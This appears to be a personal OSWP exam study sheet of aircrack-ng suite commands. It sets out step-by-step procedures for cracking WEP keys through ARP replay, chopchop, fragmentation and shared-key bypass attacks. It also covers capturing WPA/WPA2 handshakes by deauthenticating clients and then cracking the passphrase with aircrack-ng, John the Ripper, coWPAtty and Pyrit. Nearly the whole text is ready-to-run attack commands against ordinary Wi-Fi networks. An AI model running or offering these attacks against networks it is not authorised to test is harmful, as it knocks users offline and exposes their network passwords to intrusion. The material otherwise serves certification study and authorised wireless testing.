**OSWP Note**

**Setup**

- ifconfig / iwconfig
- macchanger --show
- service NetworkManager start/stop
- airmon-ng
- airmon-ng check kill
- airmon-ng start/stop wlan0
- iwlist wlan0mon channel
- airodump-ng wlan0mon [-c channel]
- airodump-ng wlan0mon [-c channel] --bssid 00:11:22:33:44:55 -w file.cap
- airodump-ng wlan0mon [-c channel] --bssid 00:11:22:33:44:55 -w file.cap -–ivs **(Only capture IVs in WEP)**
- aireplay -9 -e [ESSID] -a [AP MAC] wlan0mon **//Test injection**
- cd /root/psk-crack-dictionary
- **Screen Operations**
  - screen -S session\_name
  - **ctrl+a+d** to detach the session
  - screen -ls
  - screen -r session\_name
- **Troubleshooting**
  - No AP/STA info
    - Stop **NetworkManager**
    - Uninstall **rmmod** and reload **modprobe** driver
    - Work well in **managed** mode
  - Cannot continue to capture
    - airmon-ng check kill
    - Stop **wpa\_supplicant** process

**WEP**

- **Crack WEP with Connected Clients**
  - airmon-ng start wlan0 [channel]
  - airodump-ng [-c channel] –bssid [AP MAC] -w file.cap wlan0mon **//Capture the packets**
  - aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [My MAC] wlan0mon

**Or** aireplay-ng -1 6000 -e [ESSID] -b [AP MAC] -h [My MAC] wlan0mon **//Conduct a fake authentication attack against the AP**

  - aireplay-ng -3 -b [AP MAC] -h [My MAC] wlan0mon **//Launch the ARP request replay attack**
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Deauthenticate the connected client to force new IW generation by the AP**
  - aircrack-ng -0 file.cap **//When enough IVs has been captured, typically 25w for 64bit key, 150w for 128bit key, sometimes 5w IVs. In general, more than 10W IVs.**
- **Crack WEP Via a Client**
  - airmon-ng start wlan0 [channel]
  - airdump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon

aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [My MAC] wlan0mon

**Or** aireplay-ng -1 6000 -e [ESSID] -b [AP MAC] -h [My MAC] wlan0mon **//Conduct a fake authentication against the AP**

  - aireplay-ng -2 -b [AP MAC] -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon **//Launch the interactive packet replay attack looking for ARP packets coming from the AP**
  - aircrack-ng -0 -z file.cap **//When enough IVs have been captured**
- **Crack Clientless WEP Networks**
  - airmon-ng start wlan0 [channel]
  - airodump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon
  - aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [My MAC] wlan0mon

**Or** aireplay-ng -1 6000 -e [ESSID] -b [AP MAC] -h [My MAC] wlan0mon **//Conduct a fake authentication attack against the AP**

  - aireplay-ng -4 -b [AP MAC] -h [My MAC] wlan0mon **//Run attack 4, the KoreK chopchop attack, or attack 5, the fragmentation attack**
  - packetforge-ng -0 -a [AP MAC] -h [My MAC] -1 255.255.255.255 -k 255.255.255.255 -y [XOR filename] -w [output filename] **//Craft an ARP request packet using packetforge-ng**
  - aireplay-ng -2 -r [output filename] wlan0mon **//Inject the packet into the network using attack2, the interactive packet replay attack**
  - aircrack-ng -0 file.cap **//Crack the WEP key**
- **Bypass WEP Shared Key Authentication**
  - airmon-ng start wlan0 [channel]
  - airodump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Deauthenticate the connected client to capture the PRGA XOR keystream**
  - aireplay-ng -1 0 -e [ESSID] -y [keystream file] -a [AP MAC] -h [My MAC] wlan0mon

**Or** aireplay-ng -1 6000 -e [ESSID] -y [keystream file] -b [AP MAC] -h [My MAC] wlan0mon **//Conduct a fake key authentication using the XOR keystream**

  - aireplay-ng -3 -b [AP MAC] -h [My MAC] wlan0mon **//Launch the ARP request replay attack**
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Deauthenticate the victim client again to force the generation of an ARP packet**
  - aircrack-ng file.cap

**WPA/WPA2**

- **Use Aircrack-ng to crack WPA/WPA2 psk (√)**
  - airmon-ng start wlan0 [channel]
  - airodump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Deauthenticate a connected client to force it to complete the 4-way handshake**
  - aircrack-ng -w [wordlist] file.cap **//Crack the WPA password**
  - aircrack-ng -r [Db name] file.cap **//If I have and Airolib-ng database, it can be passed to aircrack**
- **Use JohnTheRipper and Aircrack-ng to crack WPA**
  - airmon-ng start wlan0 [channel]
  - airodump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Force a client to reconnect and complete the 4-way handshake by running a deauthentication attack against it**![](RackMultipart20210619-4-1dxxjt7_html_53ea70008fd28e3f.png)
  - john -–wordlist=[wordlist] –-rules –stdout | aircrack-ng -e [ESSID] -w - file.cap **//Once a handshake has been captured, change to the John directory and pipe in the mangled words into aircrack-ng to obtain the WPA password**

![](RackMultipart20210619-4-1dxxjt7_html_21c2402165093a7b.png)

- **Crack WPA with coWPAtty**
  - airmon-ng start wlan0 [channel]
  - airodump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Deauthenticate a connected client to force it to complete 4-way handshake**
  - cowpatty -r file.cap -f [wordlist] -2 -s [ESSID] **//To crack the WPA password with coWPAtty in wordlist mode**![](RackMultipart20210619-4-1dxxjt7_html_d34a012e9bb1aac1.png)
  - genpmk -f [wordlist] -d [hashes filename] -s [ESSID] **//To use rainbow table mode with coWPAtty, first generate the hashes**![](RackMultipart20210619-4-1dxxjt7_html_494ff00685222c4f.png)
  - cowpatty -r file.cap -d [hashes filename] -2 -s [ESSID] **//Run coWPAtty with the generated hashes to recover the WPA password**![](RackMultipart20210619-4-1dxxjt7_html_772e0bc1911584cb.png)
- **Crack WPA with Pyrit**
  - airmon-ng start wlan0 [channel]
  - airodump-ng -c [channel] –bssid [AP MAC] -w file.cap wlan0mon
  - aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan0mon **//Deauthenticate a connected client to force it to complete 4-way handshake**
  - pyrit -r file.cap -I [wordlist] -b [AP MAC] attack\_passthrough **//Run Pyrit in dictionary mode to crack the WPA password**
  - pyrit -I [wordlist] import\_passwords **//To use Pyrit in database mode, begin by importing my wordlist**
  - pyrit -e [ESSID] create\_essid **//Add the ESSID of the AP to Pyrit database**
  - pyrit batch **//Generate the PMKs for the ESSID**
  - pyrit -r file.cap -b [AP MAC] attack\_db **//Launch Pyrit in database mode to crack the WPA password**
